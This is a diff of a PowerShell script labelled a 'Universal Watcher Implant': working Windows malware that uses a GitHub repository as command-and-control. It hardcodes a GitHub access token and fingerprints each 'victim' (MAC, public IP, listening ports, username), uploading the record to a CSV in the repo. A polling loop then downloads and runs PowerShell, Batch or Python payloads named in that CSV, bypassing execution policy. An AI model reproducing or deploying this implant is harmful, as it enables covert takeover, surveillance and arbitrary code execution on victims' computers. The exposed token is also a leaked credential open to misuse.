@@ -1,10 +1,10 @@
 # ===============================================
-# UNIVERSAL WATCHER IMPLANT (Windows 7–11)
-# Auto-registers victim and executes GitHub payloads
+# UNIVERSAL WATCHER IMPLANT
+# Compatible with Windows 7–11, Server editions
 # ===============================================
 
 # === CONFIGURATION SETTINGS ===
-$GitHubToken          = "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"
+$GitHubToken          = "github_pat_11BHVK7I0VvSiMyfAEys9_O3HCtLPVr4oeyeQ4In25WjdY7s7fnugo0oXjOvhaQwMS3YCZGVIBacoJP7F"
 $RepoOwner            = "Umair13303"
 $RepoName             = "DEV_Payload"
 $CsvPathInRepo        = "GitHub_Script/Excel/Victim_Record_GitHub.csv"
@@ -23,18 +23,19 @@ $UserAgent            = "Watcher-Script"
 # === LOGGING FUNCTION ===
 function Log-Message {
     param ([string]$Text)
-    $Text | Out-File -Append $LogFile
+    $Text | Out-File -Append $LogFile -Encoding UTF8
     Write-Host $Text
 }
 
-# === CREATE PAYLOAD FOLDER & LOG START ===
+# === PREPARE FOLDERS ===
 if (-not (Test-Path $PayloadFolder)) {
     New-Item -ItemType Directory -Path $PayloadFolder | Out-Null
 }
 Log-Message "[$(Get-Date)] === Watcher started ==="
 
-# === LOAD OR CREATE VICTIM GUID ===
+# === LOAD OR GENERATE VICTIM GUID ===
 $Victim_GUID = ""
+
 try {
     $reg = Get-ItemProperty -Path $RegistryKey -Name $RegistryValue -ErrorAction SilentlyContinue
     if ($reg) { $Victim_GUID = $reg.$RegistryValue }
@@ -59,10 +60,7 @@ $wc.Headers.Add("Authorization", "token $GitHubToken")
 $wc.Headers.Add("User-Agent", $UserAgent)
 $wc.Headers.Add("Accept", "application/vnd.github.v3+json")
 
-# === WAIT BEFORE REGISTRATION ===
-Start-Sleep -Seconds $FirstWaitSeconds
-
-# === REGISTER VICTIM IF NOT EXISTS ===
+# === REGISTER VICTIM IN CSV ===
 try {
     $MetaURL = "https://api.github.com/repos/$RepoOwner/$RepoName/contents/$CsvPathInRepo"
     $metaJson = $wc.DownloadString($MetaURL)
@@ -86,22 +84,25 @@ try {
     }
 
     if (-not $alreadyExists) {
-        Log-Message "[$(Get-Date)] 🟢 Victim not found—registering..."
-
-        # Collect system info
+        # === COLLECT SYSTEM INFO ===
         $macs = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress }
         $mac  = if ($macs.Count -gt 0) { $macs[0].MACAddress } else { "UNKNOWN" }
-        try { $ip = (New-Object Net.WebClient).DownloadString("https://api.ipify.org") } catch { $ip = "UNKNOWN" }
+
+        try {
+            $ip = (New-Object Net.WebClient).DownloadString("https://api.ipify.org")
+        } catch { $ip = "UNKNOWN" }
+
         try {
             $ports = netstat -an | Select-String "LISTENING" | ForEach-Object {
                 ($_ -split "\s+")[-2] -replace ".*:", ""
             }
-            $ports = ($ports | Sort-Object -Unique) -join ","
+            $ports = ($ports | Sort-Object -Unique) -join ";"
         } catch { $ports = "UNKNOWN" }
+
         $user = $env:USERNAME
         $pass = "NOT_CAPTURED"
 
-        # Generate new ID
+        # === CREATE NEW CSV ROW SAFELY ===
         $lastId = 0
         foreach ($line in $lines) {
             if ($line -match "^\d+,") {
@@ -112,7 +113,19 @@ try {
             }
         }
         $newId = $lastId + 1
-        $newRow = "$newId,$Victim_GUID,$mac,$ip,$ports,$user,$pass,,,FALSE"
+
+        $newRow = -join @(
+            $newId,
+            $Victim_GUID,
+            $mac,
+            $ip,
+            $ports,
+            $user,
+            $pass,
+            "",
+            "",
+            "FALSE"
+        ) -replace " ", ""
 
         $allLines = $lines + $newRow
         $finalCsv = ($allLines -join "`n")
@@ -124,6 +137,7 @@ try {
             sha     = $sha
         } | ConvertTo-Json -Compress
 
+        # === UPLOAD UPDATED CSV BACK TO GITHUB ===
         $upload = [System.Net.WebRequest]::Create($MetaURL)
         $upload.Method = "PUT"
         $upload.Headers.Add("Authorization", "token $GitHubToken")
@@ -134,13 +148,19 @@ try {
         $reqStream.Write($bytes, 0, $bytes.Length)
         $reqStream.Close()
         $upload.GetResponse().Close()
-    } else {
-        Log-Message "[$(Get-Date)] 🟢 Victim already registered."
+
+        Log-Message "[$(Get-Date)] ✅ New victim registered."
+    }
+    else {
+        Log-Message "[$(Get-Date)] Victim already registered."
     }
 }
 catch {
     Log-Message "[$(Get-Date)] ❌ Registration failed: $_"
 }
+
+# === WAIT BEFORE STARTING POLLING ===
+Start-Sleep -Seconds $FirstWaitSeconds
 
 # === POLLING LOOP ===
 while ($true) {
@@ -152,18 +172,11 @@ while ($true) {
         foreach ($line in $lines) {
             if ($line -match "^\d+,") {
                 $cols = $line -split ","
-
-                # === IMPORTANT: CORRECT COLUMN INDEXES ===
-                $status = $cols[9].Trim().ToUpper()
-                if ($cols[1] -eq $Victim_GUID -and $status -eq "TRUE") {
+                if ($cols[1] -eq $Victim_GUID -and $cols[9].Trim() -eq "TRUE") {
                     $foundPayload = $true
+
                     $payloadType = $cols[7].Trim()
                     $payloadURL  = $cols[8].Trim()
-
-                    if (-not $payloadURL -or $payloadURL -eq "") {
-                        Log-Message "[$(Get-Date)] ⚠️ No payload URL specified—skipping."
-                        continue
-                    }
 
                     $ext = ".txt"
                     if ($payloadType -eq "PowerShell") { $ext = ".ps1" }
@@ -175,15 +188,18 @@ while ($true) {
                     }
 
                     $localPath = Join-Path $PayloadFolder ("payload" + $ext)
+
                     (New-Object Net.WebClient).DownloadString($payloadURL) | Out-File -Encoding UTF8 -FilePath $localPath
 
                     if ($payloadType -eq "PowerShell") {
                         Log-Message "[$(Get-Date)] ⚡ Executing PowerShell payload..."
                         powershell -ExecutionPolicy Bypass -File "$localPath"
-                    } elseif ($payloadType -eq "Batch") {
+                    }
+                    elseif ($payloadType -eq "Batch") {
                         Log-Message "[$(Get-Date)] ⚡ Executing Batch payload..."
                         Start-Process -FilePath "$localPath"
-                    } elseif ($payloadType -eq "Python") {
+                    }
+                    elseif ($payloadType -eq "Python") {
                         Log-Message "[$(Get-Date)] ⚡ Executing Python payload..."
                         Start-Process -FilePath "python.exe" -ArgumentList "$localPath"
                     }
@@ -194,7 +210,7 @@ while ($true) {
         }
 
         if (-not $foundPayload) {
-            Log-Message "[$(Get-Date)] ⚠️ No matching active payload for this GUID."
+            Log-Message "[$(Get-Date)] ⚠️ No malicious code found for this GUID."
         }
     }
     catch {
